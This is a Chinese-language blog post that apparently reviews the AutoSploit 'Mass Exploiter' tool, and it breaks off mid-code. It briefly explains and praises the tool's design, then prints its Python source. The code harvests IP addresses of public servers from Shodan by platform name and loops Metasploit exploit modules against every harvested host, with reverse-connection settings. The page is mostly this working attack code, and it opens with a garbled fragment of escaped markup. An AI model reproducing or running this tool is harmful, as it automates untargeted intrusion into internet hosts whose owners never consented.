&quot;]I.E. &#x27;IIS&#x27; will return a list of IPs belonging to IIS servers.&quot;    while True:        query = raw_input(&quot;\n&lt;&quot; + t.cyan(&quot;PLATFORM&quot;) + &quot;&gt;$ &quot;)        if query == &quot;&quot;:            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Query cannot be null.&quot;        else:            break    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please stand by while results are being collected...\n\n\n&quot;    time.sleep(1)    try:        result = api.search(query)    except Exception as e:        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An error was r...
                    
                </div> -->
                <div class="article-content markdown-body">
                    <p><a class="link" target="_blank" rel="noopener" href="https://github.com/NullArray/AutoSploit">https://github.com/NullArray/AutoSploit<i class="fas fa-external-link-alt"></i></a></p>
<p>简单看了下这个工具的源码，核心的关键代码分为两部分</p>
<ul>
<li>第一部分：通过shadon获取目标IP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api = shodan.Shodan(SHODAN_API_KEY)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = api.search(query)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if clobber == True:</span><br><span class="line">    with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:</span><br><span class="line">        for i in xrange(toolbar_width):</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                log.write(&quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>第二部分：通过MSF攻击目标IP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if choice == &#x27;s&#x27;:</span><br><span class="line">    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">        for rhosts in host_list:</span><br><span class="line">            for exploit in sorted_modules:</span><br><span class="line">                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                os.system(template)</span><br><span class="line">elif choice == &#x27;a&#x27;:</span><br><span class="line">    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">        for rhosts in host_list:</span><br><span class="line">            for exploit in all_modules:</span><br><span class="line">                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                os.system(template)</span><br><span class="line">else:</span><br><span class="line">    print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;</span><br></pre></td></tr></table></figure>

<p>这个工具这样看起来并不复杂，但更重要的是学习作者的思路，<code>利用简单的代码快速将常见的独立的工具结合起来，各取所长，实现快速自动化操作</code></p>
<p>全部代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2.7</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from subprocess import PIPE, Popen</span><br><span class="line"></span><br><span class="line">import shodan</span><br><span class="line">from blessings import Terminal</span><br><span class="line"></span><br><span class="line">t = Terminal()</span><br><span class="line"></span><br><span class="line"># Global vars</span><br><span class="line">api = &quot;&quot;</span><br><span class="line">query = &quot;&quot;</span><br><span class="line">workspace = &quot;&quot;</span><br><span class="line">local_port = &quot;&quot;</span><br><span class="line">local_host = &quot;&quot;</span><br><span class="line">configured = False</span><br><span class="line">toolbar_width = 60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Logo</span><br><span class="line">def logo():</span><br><span class="line">    print t.cyan(&quot;&quot;&quot;</span><br><span class="line">                              _____     _       _____     _     _ _   </span><br><span class="line">#--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ </span><br><span class="line">#--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|</span><br><span class="line">#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  </span><br><span class="line">#--Version: 1.0.0                                    |_|             </span><br><span class="line">##############################################</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Usage and legal.</span><br><span class="line">def usage():</span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line">    print &quot;&quot;&quot;</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">|            AutoSploit General Usage and Information                   |</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">|As the name suggests AutoSploit attempts to automate the exploitation  |</span><br><span class="line">|of remote hosts. Targets are collected by employing the Shodan.io API. |</span><br><span class="line">|                                                                       |</span><br><span class="line">|The &#x27;Gather Hosts&#x27; option will open a dialog from which you can        |</span><br><span class="line">|enter platform specific search queries such as &#x27;Apache&#x27; or &#x27;IIS&#x27;.      |</span><br><span class="line">|Upon doing so a list of candidates will be retrieved and saved to      |</span><br><span class="line">|hosts.txt in the current working directory.                            |</span><br><span class="line">|After this operation has been completed the &#x27;Exploit&#x27; option will      |</span><br><span class="line">|go about the business of attempting to exploit these targets by        |</span><br><span class="line">|running a range of Metasploit modules against them.                    |</span><br><span class="line">|                                                                       |</span><br><span class="line">|Workspace, local host and local port for MSF facilitated               |</span><br><span class="line">|back connections are configured through the dialog that comes up       |</span><br><span class="line">|before the &#x27;Exploit&#x27; module is started.                                |</span><br><span class="line">|                                                                       |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|     Option       |                   Summary                          |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|1. Usage          | Display this informational message.                |</span><br><span class="line">|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |</span><br><span class="line">|3. View Hosts     | Print gathered IPs/RHOSTS.                         |</span><br><span class="line">|4. Exploit        | Configure MSF and Start exploiting gathered targets|</span><br><span class="line">|5. Quit           | Exits AutoSploit.                                  |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|                         Legal Disclaimer                              |</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">| Usage of AutoSploit for attacking targets without prior mutual consent| </span><br><span class="line">| is illegal. It is the end user&#x27;s responsibility to obey all applicable| </span><br><span class="line">| local, state and federal laws. Developers assume no liability and are |</span><br><span class="line">| not responsible for any misuse or damage caused by this program!	|</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function that allows us to store system command</span><br><span class="line"># output in a variable</span><br><span class="line">def cmdline(command):</span><br><span class="line">    process = Popen(</span><br><span class="line">        args=command,</span><br><span class="line">        stdout=PIPE,</span><br><span class="line">        shell=True</span><br><span class="line">    )</span><br><span class="line">    return process.communicate()[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit(query):</span><br><span class="line">    global workspace</span><br><span class="line">    global local_port</span><br><span class="line">    global local_host</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    sorted_modules = []</span><br><span class="line">    all_modules = []</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Sorting modules relevant to the specified platform.&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]This may take a while...\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">    # Progress bar</span><br><span class="line">    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(&quot;\b&quot; * (toolbar_width + 1))</span><br><span class="line"></span><br><span class="line">    with open(&quot;modules.txt&quot;, &quot;rb&quot;) as infile:</span><br><span class="line">        for i in xrange(toolbar_width):</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            for lines in infile:</span><br><span class="line">                all_modules.append(lines)</span><br><span class="line">                if query in lines:</span><br><span class="line">                    sorted_modules.append(lines)</span><br><span class="line"></span><br><span class="line">            # update the bar</span><br><span class="line">            sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]AutoSploit sorted the following MSF modules based search query relevance.\n&quot;</span><br><span class="line">    # Print out the sorted modules</span><br><span class="line">    for line in sorted_modules:</span><br><span class="line">        print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line</span><br><span class="line"></span><br><span class="line">    # We&#x27;ll give the user the option to run all modules in a &#x27;hail mary&#x27; type of attack or allow</span><br><span class="line">    # a more directed approach with the sorted modules.</span><br><span class="line">    choice = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Run sorted or all modules against targets? [S]orted/[A]ll: &quot;).lower()</span><br><span class="line"></span><br><span class="line">    if choice == &#x27;s&#x27;:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">            for rhosts in host_list:</span><br><span class="line">                for exploit in sorted_modules:</span><br><span class="line">                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                    workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                    os.system(template)</span><br><span class="line">    elif choice == &#x27;a&#x27;:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">            for rhosts in host_list:</span><br><span class="line">                for exploit in all_modules:</span><br><span class="line">                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                    workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                    os.system(template)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function to gather target hosts from Shodan </span><br><span class="line">def targets(clobber=True):</span><br><span class="line">    global query</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your platform specific search query.&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]I.E. &#x27;IIS&#x27; will return a list of IPs belonging to IIS servers.&quot;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        query = raw_input(&quot;\n&lt;&quot; + t.cyan(&quot;PLATFORM&quot;) + &quot;&gt;$ &quot;)</span><br><span class="line"></span><br><span class="line">        if query == &quot;&quot;:</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Query cannot be null.&quot;</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please stand by while results are being collected...\n\n\n&quot;</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        result = api.search(query)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An error was raised with the following error message.\n&quot;</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    # Setup progress bar</span><br><span class="line">    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(&quot;\b&quot; * (toolbar_width + 1))</span><br><span class="line"></span><br><span class="line">    if clobber == True:</span><br><span class="line">        with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:</span><br><span class="line">            for i in xrange(toolbar_width):</span><br><span class="line">                time.sleep(0.1)</span><br><span class="line">                for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                    log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                    log.write(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">                # update the bar</span><br><span class="line">                sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        hostpath = os.path.abspath(&quot;hosts.txt&quot;)</span><br><span class="line"></span><br><span class="line">        print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Host list saved to &quot; + hostpath</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;ab&quot;) as log:</span><br><span class="line">            for i in xrange(toolbar_width):</span><br><span class="line">                time.sleep(0.1)</span><br><span class="line">                for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                    log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                    log.write(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # update the bar</span><br><span class="line">        sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        hostpath = os.path.abspath(&quot;hosts.txt&quot;)</span><br><span class="line"></span><br><span class="line">        print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Hosts appended to list at &quot; + hostpath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function to define metasploit settings</span><br><span class="line">def settings():</span><br><span class="line">    global workspace</span><br><span class="line">    global local_port</span><br><span class="line">    global local_host</span><br><span class="line">    global configured</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]MSF Settings\n&quot;</span><br><span class="line">    print &quot;In order to proceed with the exploit module some MSF&quot;</span><br><span class="line">    print &quot;settings need to be configured.&quot;</span><br><span class="line">    time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Note.\n&quot;</span><br><span class="line">    print &quot;Please make sure your Network is configured properly.\n&quot;</span><br><span class="line">    print &quot;In order to handle incoming Reverse Connections&quot;</span><br><span class="line">    print &quot;your external Facing IP &amp; Port need to be reachable...&quot;</span><br><span class="line">    time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    workspace = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the Workspace name: &quot;)</span><br><span class="line">    if not workspace == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Workspace set to: &quot; + workspace</span><br><span class="line">    else:</span><br><span class="line">        workspace = False</span><br><span class="line"></span><br><span class="line">    local_host = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local host: &quot;)</span><br><span class="line">    if not local_host == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local host set to: &quot; + repr(local_host)</span><br><span class="line">    else:</span><br><span class="line">        local_host = False</span><br><span class="line"></span><br><span class="line">    local_port = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local port: &quot;)</span><br><span class="line">    if not local_host == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local port set to: &quot; + repr(local_port)</span><br><span class="line">    else:</span><br><span class="line">        local_port = False</span><br><span class="line"></span><br><span class="line">    # Check if settings are not null</span><br><span class="line">    if workspace == False or local_host == False or local_port == False:</span><br><span class="line">        configured = None</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. LPORT, LHOST and/or workspace cannot be null&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Restarting MSF Settings module.&quot;</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">    else:</span><br><span class="line">        # If everything has been properly configured we&#x27;re setting config var to true</span><br><span class="line">        # When we return to the main menu loop we will use it to check to see if we</span><br><span class="line">        # can skip the config stage. When the exploit component is run a second time</span><br><span class="line">        configured = True</span><br><span class="line"></span><br><span class="line">        if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line">            print &quot;In order for the exploit module to work, a host file needs to be&quot;</span><br><span class="line">            print &quot;present.&quot;</span><br><span class="line">        else:</span><br><span class="line">            # Call exploit function, the &#x27;query&#x27; argument contains the search strig provided</span><br><span class="line">            # in the &#x27;gather hosts&#x27; function. We will check this string against the MSF</span><br><span class="line">            # modules in order to sort out the most relevant ones with regards to the intended</span><br><span class="line">            # targets.</span><br><span class="line">            exploit(query)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Main menu</span><br><span class="line">def main():</span><br><span class="line">    global query</span><br><span class="line">    global configured</span><br><span class="line">    global api</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        api = shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. API setup failed.\n&quot;</span><br><span class="line">        print e</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            # Make sure a misconfiguration in the MSF settings</span><br><span class="line">            # Doesn&#x27;t execute main menu loop but returns us to the</span><br><span class="line">            # appropriate function for handling those settings</span><br><span class="line">            if configured == None:</span><br><span class="line">                settings()</span><br><span class="line"></span><br><span class="line">            print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Welcome to AutoSploit. Please select an action.&quot;</span><br><span class="line">            print &quot;&quot;&quot;</span><br><span class="line">		</span><br><span class="line">1. Usage		3. View Hosts		5. Quit</span><br><span class="line">2. Gather Hosts		4. Exploit 					</span><br><span class="line">									&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">            action = raw_input(&quot;\n&lt;&quot; + t.cyan(&quot;AUTOSPLOIT&quot;) + &quot;&gt;$ &quot;)</span><br><span class="line"></span><br><span class="line">            if action == &#x27;1&#x27;:</span><br><span class="line">                usage()</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;2&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    